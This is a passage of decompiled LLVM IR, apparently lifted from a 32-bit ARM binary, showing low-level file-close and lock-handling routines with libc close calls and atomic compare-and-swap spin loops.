  %v3_17898 = zext i16 %v2_17898 to i32
  store i32 %v3_17898, i32* %r3.global-to-local, align 4
  %v1_1789c = and i32 %v3_17898, 64
  %v2_1789c = icmp eq i32 %v1_1789c, 0
  br i1 %v2_1789c, label %bb43, label %bb42

bb42:                                             ; preds = %dec_label_pc_17898
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_17898, %bb42
  %storemerge = phi i32 [ %v1_178a0, %bb42 ], [ %v1_1789c, %dec_label_pc_17898 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 96424, i32* @lr, align 4
  %v1_178a4 = xor i1 %v2_1789c, true
  call void @__pseudo_cond_branch(i1 %v1_178a4, i32 ptrtoint (i32* @global_var_186e8.1017 to i32))
  %v0_178a8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_178a8, i32* %fp.global-to-local, align 4
  %v0_178ac = load i32, i32* @r5, align 4
  %v1_178ac = add i32 %v0_178ac, 4
  %v2_178ac = inttoptr i32 %v1_178ac to i32*
  %v3_178ac = load i32, i32* %v2_178ac, align 4
  store i32 %v3_178ac, i32* %r0.global-to-local, align 4
  %v1_178b0 = call i32 @__GI___libc_close(i32 %v3_178ac)
  store i32 %v1_178b0, i32* %r0.global-to-local, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_178b8 = load i32, i32* @r8, align 4
  %v2_178b8 = add i32 %v0_178b8, 160
  %v3_178b8 = inttoptr i32 %v2_178b8 to i32*
  %v4_178b8 = load i32, i32* %v3_178b8, align 4
  store i32 %v4_178b8, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_178bc = icmp slt i32 %v1_178b0, 0
  br i1 %v1_178bc, label %bb44, label %bb45

bb44:                                             ; preds = %bb43
  store i32 -1, i32* %fp.global-to-local, align 4
  br label %bb45

bb45:                                             ; preds = %bb43, %bb44
  %v1_178c4 = add i32 %v4_178b8, 8
  %v2_178c4 = inttoptr i32 %v1_178c4 to i32*
  %v3_178c4 = load i32, i32* %v2_178c4, align 4
  store i32 %v3_178c4, i32* %r3.global-to-local, align 4
  %v0_178c8 = call i32 @__aeabi_read_tp()
  store i32 %v0_178c8, i32* %r0.global-to-local, align 4
  %v1_178cc = add i32 %v0_178c8, -1168
  store i32 %v1_178cc, i32* %sl.global-to-local, align 4
  %v0_178d0 = load i32, i32* %r3.global-to-local, align 4
  %v3_178d0 = icmp uge i32 %v0_178d0, %v1_178cc
  store i1 %v3_178d0, i1* %cpsr_c.global-to-local, align 1
  %v9_178d0 = icmp eq i32 %v0_178d0, %v1_178cc
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_178d8 = load i32, i32* @r5, align 4
  %v2_178d8 = add i32 %v1_178d8, 4
  %v3_178d8 = inttoptr i32 %v2_178d8 to i32*
  store i32 -1, i32* %v3_178d8, align 4
  br i1 %v9_178d0, label %dec_label_pc_17920, label %dec_label_pc_178e0

dec_label_pc_178e0:                               ; preds = %bb45
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_178e4 = load i32, i32* @r7, align 4
  store i32 %v0_178e4, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_178ec108 = inttoptr i32 %v0_178e4 to i32*
  %v2_178ec109 = load i32, i32* %v1_178ec108, align 4
  store i32 %v2_178ec109, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_178f0111 = icmp eq i32 %v2_178ec109, 0
  br i1 %v9_178f0111, label %dec_label_pc_178f8, label %dec_label_pc_17910

dec_label_pc_178f8:                               ; preds = %dec_label_pc_178e0, %dec_label_pc_178f8.dec_label_pc_178ec_crit_edge
  %v0_178f8112 = phi i32 [ %v1_178f0.pre, %dec_label_pc_178f8.dec_label_pc_178ec_crit_edge ], [ 0, %dec_label_pc_178e0 ]
  store i32 %v0_178f8112, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17908 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17908, label %dec_label_pc_1790c, label %dec_label_pc_178f8.dec_label_pc_178ec_crit_edge

dec_label_pc_178f8.dec_label_pc_178ec_crit_edge:  ; preds = %dec_label_pc_178f8
  %v0_178ec.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_178f0.pre = load i32, i32* @r4, align 4
  %v1_178ec = inttoptr i32 %v0_178ec.pre to i32*
  %v2_178ec = load i32, i32* %v1_178ec, align 4
  store i32 %v2_178ec, i32* %r3.global-to-local, align 4
  %v3_178f0 = icmp uge i32 %v2_178ec, %v1_178f0.pre
  store i1 %v3_178f0, i1* %cpsr_c.global-to-local, align 1
  %v9_178f0 = icmp eq i32 %v2_178ec, %v1_178f0.pre
  br i1 %v9_178f0, label %dec_label_pc_178f8, label %dec_label_pc_17910

dec_label_pc_1790c:                               ; preds = %dec_label_pc_178f8
  %v0_1790c = load i32, i32* @r4, align 4
  store i32 %v0_1790c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17910

dec_label_pc_17910:                               ; preds = %dec_label_pc_178e0, %dec_label_pc_178f8.dec_label_pc_178ec_crit_edge, %dec_label_pc_1790c
  %v0_17910 = phi i32 [ %v0_1790c, %dec_label_pc_1790c ], [ %v2_178ec109, %dec_label_pc_178e0 ], [ %v2_178ec, %dec_label_pc_178f8.dec_label_pc_178ec_crit_edge ]
  %v1_17910 = phi i32 [ %v0_1790c, %dec_label_pc_1790c ], [ 0, %dec_label_pc_178e0 ], [ %v1_178f0.pre, %dec_label_pc_178f8.dec_label_pc_178ec_crit_edge ]
  %v3_17910 = icmp uge i32 %v0_17910, %v1_17910
  store i1 %v3_17910, i1* %cpsr_c.global-to-local, align 1
  %v9_17910 = icmp eq i32 %v0_17910, %v1_17910
  br i1 %v9_17910, label %bb47, label %bb46

bb46:                                             ; preds = %dec_label_pc_17910
  %v1_17914 = load i32, i32* @r7, align 4
  store i32 %v1_17914, i32* %r0.global-to-local, align 4
  br label %bb47

bb47:                                             ; preds = %dec_label_pc_17910, %bb46
  %v1_17918 = xor i1 %v9_17910, true
  call void @__pseudo_cond_branch(i1 %v1_17918, i32 ptrtoint (i32* @global_var_16040.925 to i32))
  %v0_1791c = load i32, i32* %sl.global-to-local, align 4
  %v1_1791c = load i32, i32* @r7, align 4
  %v2_1791c = add i32 %v1_1791c, 8
  %v3_1791c = inttoptr i32 %v2_1791c to i32*
  store i32 %v0_1791c, i32* %v3_1791c, align 4
  br label %dec_label_pc_17920

dec_label_pc_17920:                               ; preds = %bb45, %bb47
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_17924 = load i32, i32* @r8, align 4
  %v2_17924 = add i32 %v0_17924, 160
  %v3_17924 = inttoptr i32 %v2_17924 to i32*
  %v4_17924 = load i32, i32* %v3_17924, align 4
  store i32 %v4_17924, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_1792c = add i32 %v0_17924, 12
  %v3_1792c = inttoptr i32 %v2_1792c to i32*
  %v4_1792c = load i32, i32* %v3_1792c, align 4
  store i32 %v4_1792c, i32* %r2.global-to-local, align 4
  %v1_17930 = add i32 %v4_17924, 4
  %v2_17930 = inttoptr i32 %v1_17930 to i32*
  %v3_17930 = load i32, i32* %v2_17930, align 4
  store i32 %v3_17930, i32* %r1.global-to-local, align 4
  %v1_17934 = inttoptr i32 %v4_1792c to i32*
  %v2_17934 = load i32, i32* %v1_17934, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17938 = icmp eq i32 %v3_17930, 0
  %v1_1793c = add i32 %v2_17934, 1
  store i32 %v1_1793c, i32* %r3.global-to-local, align 4
  store i32 %v1_1793c, i32* %v1_17934, align 4
  br i1 %v2_17938, label %dec_label_pc_17948, label %dec_label_pc_179a8

dec_label_pc_17948:                               ; preds = %dec_label_pc_17920
  %v0_17948 = load i32, i32* %r1.global-to-local, align 4
  %v1_17948 = load i32, i32* %r0.global-to-local, align 4
  %v2_17948 = add i32 %v1_17948, 8
  %v3_17948 = inttoptr i32 %v2_17948 to i32*
  store i32 %v0_17948, i32* %v3_17948, align 4
  %v0_1794c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1794c, i32* @r7, align 4
  br label %dec_label_pc_17950

dec_label_pc_17950:                               ; preds = %dec_label_pc_17980.dec_label_pc_17950_crit_edge, %dec_label_pc_17948
  %v0_17950 = phi i32 [ %v0_17950.pre, %dec_label_pc_17980.dec_label_pc_17950_crit_edge ], [ %v0_1794c, %dec_label_pc_17948 ]
  %v1_17950 = inttoptr i32 %v0_17950 to i32*
  %v2_17950 = load i32, i32* %v1_17950, align 4
  store i32 %v2_17950, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_17950, i32* %r2.global-to-local, align 4
  %v2_1795c96 = load i32, i32* %v1_17950, align 4
  store i32 %v2_1795c96, i32* %r3.global-to-local, align 4
  %v3_1796098 = icmp uge i32 %v2_1795c96, %v2_17950
  store i1 %v3_1796098, i1* %cpsr_c.global-to-local, align 1
  %v9_17960104 = icmp eq i32 %v2_1795c96, %v2_17950
  br i1 %v9_17960104, label %dec_label_pc_17968, label %dec_label_pc_17980

dec_label_pc_17968:                               ; preds = %dec_label_pc_17950, %dec_label_pc_17968.dec_label_pc_1795c_crit_edge
  %v0_17968105 = phi i32 [ %v1_17960.pre, %dec_label_pc_17968.dec_label_pc_1795c_crit_edge ], [ %v2_17950, %dec_label_pc_17950 ]
  store i32 %v0_17968105, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17978 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17978, label %dec_label_pc_1797c, label %dec_label_pc_17968.dec_label_pc_1795c_crit_edge

dec_label_pc_17968.dec_label_pc_1795c_crit_edge:  ; preds = %dec_label_pc_17968
  %v0_1795c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17960.pre = load i32, i32* @r4, align 4
  %v1_1795c = inttoptr i32 %v0_1795c.pre to i32*
  %v2_1795c = load i32, i32* %v1_1795c, align 4
  store i32 %v2_1795c, i32* %r3.global-to-local, align 4
  %v3_17960 = icmp uge i32 %v2_1795c, %v1_17960.pre
  store i1 %v3_17960, i1* %cpsr_c.global-to-local, align 1
  %v9_17960 = icmp eq i32 %v2_1795c, %v1_17960.pre
  br i1 %v9_17960, label %dec_label_pc_17968, label %dec_label_pc_17980

dec_label_pc_1797c:                               ; preds = %dec_label_pc_17968
  %v0_1797c = load i32, i32* @r4, align 4
  store i32 %v0_1797c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17980

dec_label_pc_17980:                               ; preds = %dec_label_pc_17950, %dec_label_pc_17968.dec_label_pc_1795c_crit_edge, %dec_label_pc_1797c
  %v0_17988 = phi i32 [ %v0_1797c, %dec_label_pc_1797c ], [ %v2_1795c96, %dec_label_pc_17950 ], [ %v2_1795c, %dec_label_pc_17968.dec_label_pc_1795c_crit_edge ]
  %v1_17980 = phi i32 [ %v0_1797c, %dec_label_pc_1797c ], [ %v2_17950, %dec_label_pc_17950 ], [ %v1_17960.pre, %dec_label_pc_17968.dec_label_pc_1795c_crit_edge ]
  %v3_17980 = icmp uge i32 %v0_17988, %v1_17980
  store i1 %v3_17980, i1* %cpsr_c.global-to-local, align 1
  %v9_17980 = icmp eq i32 %v0_17988, %v1_17980
  br i1 %v9_17980, label %dec_label_pc_17988, label %dec_label_pc_17980.dec_label_pc_17950_crit_edge

dec_label_pc_17980.dec_label_pc_17950_crit_edge:  ; preds = %dec_label_pc_17980
  %v0_17950.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_17950

dec_label_pc_17988:                               ; preds = %dec_label_pc_17980
  %v2_17988 = icmp ne i32 %v1_17980, 0
  store i1 %v2_17988, i1* %cpsr_c.global-to-local, align 1
  %v7_1798c = icmp slt i32 %v1_17980, 2
  br i1 %v7_1798c, label %dec_label_pc_179a8, label %dec_label_pc_17990

dec_label_pc_17990:                               ; preds = %dec_label_pc_17988
  %v0_17990 = load i32, i32* @r7, align 4
  store i32 %v0_17990, i32* %r0.global-to-local, align 4
  %v0_17994 = load i32, i32* %r1.global-to-local, align 4
  %v1_17994 = add i32 %v0_17994, 129
  store i32 %v1_17994, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_179a8

dec_label_pc_179a8:                               ; preds = %dec_label_pc_17920, %dec_label_pc_17990, %dec_label_pc_17988
  %v0_179a8 = load i32, i32* @r5, align 4
  %v1_179a8 = inttoptr i32 %v0_179a8 to i16*
  %v2_179a8 = load i16, i16* %v1_179a8, align 2
  %v3_179a8 = zext i16 %v2_179a8 to i32
  %v1_179ac = and i32 %v3_179a8, 24576
  %v1_179b0 = or i32 %v1_179ac, 48
  store i32 %v1_179b0, i32* %r3.global-to-local, align 4
  %v0_179b4 = load i32, i32* %sb.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_179b4 = icmp eq i32 %v0_179b4, 0
  %v1_179b8 = trunc i32 %v1_179b0 to i16
  store i16 %v1_179b8, i16* %v1_179a8, align 2
  br i1 %v2_179b4, label %dec_label_pc_179c0, label %dec_label_pc_17a34

dec_label_pc_179c0:                               ; preds = %dec_label_pc_179a8
  %v0_179c0 = load i32, i32* @r5, align 4
  %v1_179c0 = add i32 %v0_179c0, 60
  %v2_179c0 = inttoptr i32 %v1_179c0 to i32*
  %v3_179c0 = load i32, i32* %v2_179c0, align 4
  %v1_179c4 = add i32 %v3_179c0, -1
  store i32 %v1_179c4, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_179c8 = icmp eq i32 %v1_179c4, 0
  store i32 %v1_179c4, i32* %v2_179c0, align 4
  br i1 %v2_179c8, label %dec_label_pc_179d4, label %dec_label_pc_17a34

dec_label_pc_179d4:                               ; preds = %dec_label_pc_179c0
  %v0_179d4 = load i32, i32* %r3.global-to-local, align 4
  %v1_179d4 = load i32, i32* @r5, align 4
  %v2_179d4 = add i32 %v1_179d4, 64
  %v3_179d4 = inttoptr i32 %v2_179d4 to i32*
  store i32 %v0_179d4, i32* %v3_179d4, align 4
  %v0_179d8 = load i32, i32* @r5, align 4
  %v1_179d8 = add i32 %v0_179d8, 56
  store i32 %v1_179d8, i32* @r6, align 4
  br label %dec_label_pc_179dc

dec_label_pc_179dc:                               ; preds = %dec_label_pc_17a0c.dec_label_pc_179dc_crit_edge, %dec_label_pc_179d4
  %v0_179e4 = phi i32 [ %v0_179e4.pre, %dec_label_pc_17a0c.dec_label_pc_179dc_crit_edge ], [ %v1_179d8, %dec_label_pc_179d4 ]
  %v0_179dc = phi i32 [ %v0_179dc.pre, %dec_label_pc_17a0c.dec_label_pc_179dc_crit_edge ], [ %v0_179d8, %dec_label_pc_179d4 ]
  %v1_179dc = add i32 %v0_179dc, 56
  %v2_179dc = inttoptr i32 %v1_179dc to i32*
  %v3_179dc = load i32, i32* %v2_179dc, align 4
  store i32 %v3_179dc, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_179e4, i32* %r2.global-to-local, align 4
  %v1_179e882 = inttoptr i32 %v0_179e4 to i32*
  %v2_179e883 = load i32, i32* %v1_179e882, align 4
  store i32 %v2_179e883, i32* %r3.global-to-local, align 4
  %v3_179ec85 = icmp uge i32 %v2_179e883, %v3_179dc
  store i1 %v3_179ec85, i1* %cpsr_c.global-to-local, align 1
  %v9_179ec91 = icmp eq i32 %v2_179e883, %v3_179dc
  br i1 %v9_179ec91, label %dec_label_pc_179f4, label %dec_label_pc_17a0c

dec_label_pc_179f4:                               ; preds = %dec_label_pc_179dc, %dec_label_pc_179f4.dec_label_pc_179e8_crit_edge
  %v0_179f492 = phi i32 [ %v1_179ec.pre, %dec_label_pc_179f4.dec_label_pc_179e8_crit_edge ], [ %v3_179dc, %dec_label_pc_179dc ]
  store i32 %v0_179f492, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17a04 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17a04, label %dec_label_pc_17a08, label %dec_label_pc_179f4.dec_label_pc_179e8_crit_edge

dec_label_pc_179f4.dec_label_pc_179e8_crit_edge:  ; preds = %dec_label_pc_179f4
  %v0_179e8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_179ec.pre = load i32, i32* @r4, align 4
  %v1_179e8 = inttoptr i32 %v0_179e8.pre to i32*
  %v2_179e8 = load i32, i32* %v1_179e8, align 4
  store i32 %v2_179e8, i32* %r3.global-to-local, align 4
  %v3_179ec = icmp uge i32 %v2_179e8, %v1_179ec.pre
  store i1 %v3_179ec, i1* %cpsr_c.global-to-local, align 1
  %v9_179ec = icmp eq i32 %v2_179e8, %v1_179ec.pre
  br i1 %v9_179ec, label %dec_label_pc_179f4, label %dec_label_pc_17a0c

dec_label_pc_17a08:                               ; preds = %dec_label_pc_179f4
  %v0_17a08 = load i32, i32* @r4, align 4
  store i32 %v0_17a08, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17a0c

dec_label_pc_17a0c:                               ; preds = %dec_label_pc_179dc, %dec_label_pc_179f4.dec_label_pc_179e8_crit_edge, %dec_label_pc_17a08
  %v0_17a14 = phi i32 [ %v0_17a08, %dec_label_pc_17a08 ], [ %v2_179e883, %dec_label_pc_179dc ], [ %v2_179e8, %dec_label_pc_179f4.dec_label_pc_179e8_crit_edge ]
  %v1_17a0c = phi i32 [ %v0_17a08, %dec_label_pc_17a08 ], [ %v3_179dc, %dec_label_pc_179dc ], [ %v1_179ec.pre, %dec_label_pc_179f4.dec_label_pc_179e8_crit_edge ]
  %v3_17a0c = icmp uge i32 %v0_17a14, %v1_17a0c
  store i1 %v3_17a0c, i1* %cpsr_c.global-to-local, align 1
  %v9_17a0c = icmp eq i32 %v0_17a14, %v1_17a0c
  br i1 %v9_17a0c, label %dec_label_pc_17a14, label %dec_label_pc_17a0c.dec_label_pc_179dc_crit_edge

dec_label_pc_17a0c.dec_label_pc_179dc_crit_edge:  ; preds = %dec_label_pc_17a0c
  %v0_179dc.pre = load i32, i32* @r5, align 4
  %v0_179e4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_179dc

dec_label_pc_17a14:                               ; preds = %dec_label_pc_17a0c
  %v2_17a14 = icmp ne i32 %v1_17a0c, 0
  store i1 %v2_17a14, i1* %cpsr_c.global-to-local, align 1
  %v7_17a18 = icmp slt i32 %v1_17a0c, 2
  br i1 %v7_17a18, label %dec_label_pc_17a34, label %dec_label_pc_17a1c

dec_label_pc_17a1c:                               ; preds = %dec_label_pc_17a14
  %v0_17a1c = load i32, i32* @r5, align 4
  %v1_17a1c = add i32 %v0_17a1c, 56
  store i32 %v1_17a1c, i32* %r0.global-to-local, align 4
  %v0_17a20 = load i32, i32* %r1.global-to-local, align 4
  %v1_17a20 = add i32 %v0_17a20, 129
  store i32 %v1_17a20, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17a34

dec_label_pc_17a34:                               ; preds = %dec_label_pc_179c0, %dec_label_pc_179a8, %dec_label_pc_17a1c, %dec_label_pc_17a14
  %v0_17a34 = load i32, i32* @r5, align 4
  %v1_17a34 = inttoptr i32 %v0_17a34 to i16*
  %v2_17a34 = load i16, i16* %v1_17a34, align 2
  %v3_17a34 = zext i16 %v2_17a34 to i32
  store i32 %v3_17a34, i32* %r3.global-to-local, align 4
  %v1_17a38 = and i32 %v3_17a34, 16384
  %v2_17a38 = icmp eq i32 %v1_17a38, 0
  br i1 %v2_17a38, label %bb49, label %bb48

bb48:                                             ; preds = %dec_label_pc_17a34
  %v2_17a3c = add i32 %v0_17a34, 8
  %v3_17a3c = inttoptr i32 %v2_17a3c to i32*
  %v4_17a3c = load i32, i32* %v3_17a3c, align 4
  store i32 %v4_17a3c, i32* %r0.global-to-local, align 4
  br label %bb49

bb49:                                             ; preds = %dec_label_pc_17a34, %bb48
  %v1_17a40 = xor i1 %v2_17a38, true
  call void @__pseudo_cond_branch(i1 %v1_17a40, i32 ptrtoint (i32* @global_var_1509c.29 to i32))
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_17a48 = load i32, i32* @r8, align 4
  %v2_17a48 = add i32 %v0_17a48, 160
  %v3_17a48 = inttoptr i32 %v2_17a48 to i32*
  %v4_17a48 = load i32, i32* %v3_17a48, align 4
  store i32 %v4_17a48, i32* @r5, align 4
  %v1_17a4c = add i32 %v4_17a48, 8
  %v2_17a4c = inttoptr i32 %v1_17a4c to i32*
  %v3_17a4c = load i32, i32* %v2_17a4c, align 4
  store i32 %v3_17a4c, i32* %r3.global-to-local, align 4
  %v1_17a50 = load i32, i32* %sl.global-to-local, align 4
  %v3_17a50 = icmp uge i32 %v3_17a4c, %v1_17a50
  store i1 %v3_17a50, i1* %cpsr_c.global-to-local, align 1
  %v9_17a50 = icmp eq i32 %v3_17a4c, %v1_17a50
  br i1 %v9_17a50, label %dec_label_pc_17a98, label %dec_label_pc_17a58

dec_label_pc_17a58:                               ; preds = %bb49
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_17a48, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_17a6475 = inttoptr i32 %v4_17a48 to i32*
  %v2_17a6476 = load i32, i32* %v1_17a6475, align 4
  store i32 %v2_17a6476, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_17a6878 = icmp eq i32 %v2_17a6476, 0
  br i1 %v9_17a6878, label %dec_label_pc_17a70, label %dec_label_pc_17a88

dec_label_pc_17a70:                               ; preds = %dec_label_pc_17a58, %dec_label_pc_17a70.dec_label_pc_17a64_crit_edge
  %v0_17a7079 = phi i32 [ %v1_17a68.pre, %dec_label_pc_17a70.dec_label_pc_17a64_crit_edge ], [ 0, %dec_label_pc_17a58 ]
  store i32 %v0_17a7079, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17a80 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17a80, label %dec_label_pc_17a84, label %dec_label_pc_17a70.dec_label_pc_17a64_crit_edge

dec_label_pc_17a70.dec_label_pc_17a64_crit_edge:  ; preds = %dec_label_pc_17a70
  %v0_17a64.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17a68.pre = load i32, i32* @r4, align 4
  %v1_17a64 = inttoptr i32 %v0_17a64.pre to i32*
  %v2_17a64 = load i32, i32* %v1_17a64, align 4
  store i32 %v2_17a64, i32* %r3.global-to-local, align 4
  %v3_17a68 = icmp uge i32 %v2_17a64, %v1_17a68.pre
  store i1 %v3_17a68, i1* %cpsr_c.global-to-local, align 1
  %v9_17a68 = icmp eq i32 %v2_17a64, %v1_17a68.pre
  br i1 %v9_17a68, label %dec_label_pc_17a70, label %dec_label_pc_17a88

dec_label_pc_17a84:                               ; preds = %dec_label_pc_17a70
  %v0_17a84 = load i32, i32* @r4, align 4
  store i32 %v0_17a84, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17a88

dec_label_pc_17a88:                               ; preds = %dec_label_pc_17a58, %dec_label_pc_17a70.dec_label_pc_17a64_crit_edge, %dec_label_pc_17a84
  %v0_17a88 = phi i32 [ %v0_17a84, %dec_label_pc_17a84 ], [ %v2_17a6476, %dec_label_pc_17a58 ], [ %v2_17a64, %dec_label_pc_17a70.dec_label_pc_17a64_crit_edge ]
  %v1_17a88 = phi i32 [ %v0_17a84, %dec_label_pc_17a84 ], [ 0, %dec_label_pc_17a58 ], [ %v1_17a68.pre, %dec_label_pc_17a70.dec_label_pc_17a64_crit_edge ]
  %v3_17a88 = icmp uge i32 %v0_17a88, %v1_17a88
  store i1 %v3_17a88, i1* %cpsr_c.global-to-local, align 1
  %v9_17a88 = icmp eq i32 %v0_17a88, %v1_17a88
  br i1 %v9_17a88, label %bb51, label %bb50

bb50:                                             ; preds = %dec_label_pc_17a88
  %v1_17a8c = load i32, i32* @r5, align 4
  store i32 %v1_17a8c, i32* %r0.global-to-local, align 4
  br label %bb51

bb51:                                             ; preds = %dec_label_pc_17a88, %bb50
  %v1_17a90 = xor i1 %v9_17a88, true
  call void @__pseudo_cond_branch(i1 %v1_17a90, i32 ptrtoint (i32* @global_var_16040.925 to i32))
  %v0_17a94 = load i32, i32* %sl.global-to-local, align 4
  %v1_17a94 = load i32, i32* @r5, align 4
  %v2_17a94 = add i32 %v1_17a94, 8
  %v3_17a94 = inttoptr i32 %v2_17a94 to i32*
  store i32 %v0_17a94, i32* %v3_17a94, align 4
  %v0_17a9c.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_17a98

dec_label_pc_17a98:                               ; preds = %bb49, %bb51
  %v0_17a9c = phi i32 [ %v0_17a48, %bb49 ], [ %v0_17a9c.pre, %bb51 ]
  store i32 80, i32* %r3.global-to-local, align 4
  %v2_17a9c = add i32 %v0_17a9c, 80
  %v3_17a9c = inttoptr i32 %v2_17a9c to i32*
  %v4_17a9c = load i32, i32* %v3_17a9c, align 4
  store i32 %v4_17a9c, i32* %r2.global-to-local, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  %v2_17aa4 = add i32 %v0_17a9c, 160
  %v3_17aa4 = inttoptr i32 %v2_17aa4 to i32*
  %v4_17aa4 = load i32, i32* %v3_17aa4, align 4
  store i32 %v4_17aa4, i32* %r0.global-to-local, align 4
  %v1_17aa8 = inttoptr i32 %v4_17a9c to i32*
  %v2_17aa8 = load i32, i32* %v1_17aa8, align 4
  store i32 %v2_17aa8, i32* %r3.global-to-local, align 4
  %v1_17aac = add i32 %v4_17aa4, 4
  %v2_17aac = inttoptr i32 %v1_17aac to i32*
  %v3_17aac = load i32, i32* %v2_17aac, align 4
  store i32 %v3_17aac, i32* %r1.global-to-local, align 4
  %v1_17ab0 = add i32 %v2_17aa8, 1
  store i32 %v1_17ab0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17ab4 = icmp eq i32 %v3_17aac, 0
  store i32 %v1_17ab0, i32* %v1_17aa8, align 4
  br i1 %v2_17ab4, label %dec_label_pc_17ac0, label %dec_label_pc_17b20

dec_label_pc_17ac0:                               ; preds = %dec_label_pc_17a98
  %v0_17ac0 = load i32, i32* %r1.global-to-local, align 4
  %v1_17ac0 = load i32, i32* %r0.global-to-local, align 4
  %v2_17ac0 = add i32 %v1_17ac0, 8
  %v3_17ac0 = inttoptr i32 %v2_17ac0 to i32*
  store i32 %v0_17ac0, i32* %v3_17ac0, align 4
  %v0_17ac4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_17ac4, i32* @r5, align 4
  br label %dec_label_pc_17ac8

dec_label_pc_17ac8:                               ; preds = %dec_label_pc_17af8.dec_label_pc_17ac8_crit_edge, %dec_label_pc_17ac0
  %v0_17ac8 = phi i32 [ %v0_17ac8.pre, %dec_label_pc_17af8.dec_label_pc_17ac8_crit_edge ], [ %v0_17ac4, %dec_label_pc_17ac0 ]
  %v1_17ac8 = inttoptr i32 %v0_17ac8 to i32*
  %v2_17ac8 = load i32, i32* %v1_17ac8, align 4
  store i32 %v2_17ac8, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_17ac8, i32* %r2.global-to-local, align 4
  %v2_17ad464 = load i32, i32* %v1_17ac8, align 4
  store i32 %v2_17ad464, i32* %r3.global-to-local, align 4
  %v3_17ad866 = icmp uge i32 %v2_17ad464, %v2_17ac8
  store i1 %v3_17ad866, i1* %cpsr_c.global-to-local, align 1
  %v9_17ad872 = icmp eq i32 %v2_17ad464, %v2_17ac8
  br i1 %v9_17ad872, label %dec_label_pc_17ae0, label %dec_label_pc_17af8

dec_label_pc_17ae0:                               ; preds = %dec_label_pc_17ac8, %dec_label_pc_17ae0.dec_label_pc_17ad4_crit_edge
  %v0_17ae073 = phi i32 [ %v1_17ad8.pre, %dec_label_pc_17ae0.dec_label_pc_17ad4_crit_edge ], [ %v2_17ac8, %dec_label_pc_17ac8 ]
  store i32 %v0_17ae073, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17af0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17af0, label %dec_label_pc_17af4, label %dec_label_pc_17ae0.dec_label_pc_17ad4_crit_edge

dec_label_pc_17ae0.dec_label_pc_17ad4_crit_edge:  ; preds = %dec_label_pc_17ae0
  %v0_17ad4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17ad8.pre = load i32, i32* @r4, align 4
  %v1_17ad4 = inttoptr i32 %v0_17ad4.pre to i32*
  %v2_17ad4 = load i32, i32* %v1_17ad4, align 4
  store i32 %v2_17ad4, i32* %r3.global-to-local, align 4
  %v3_17ad8 = icmp uge i32 %v2_17ad4, %v1_17ad8.pre
  store i1 %v3_17ad8, i1* %cpsr_c.global-to-local, align 1
  %v9_17ad8 = icmp eq i32 %v2_17ad4, %v1_17ad8.pre
  br i1 %v9_17ad8, label %dec_label_pc_17ae0, label %dec_label_pc_17af8

dec_label_pc_17af4:                               ; preds = %dec_label_pc_17ae0
  %v0_17af4 = load i32, i32* @r4, align 4
  store i32 %v0_17af4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17af8

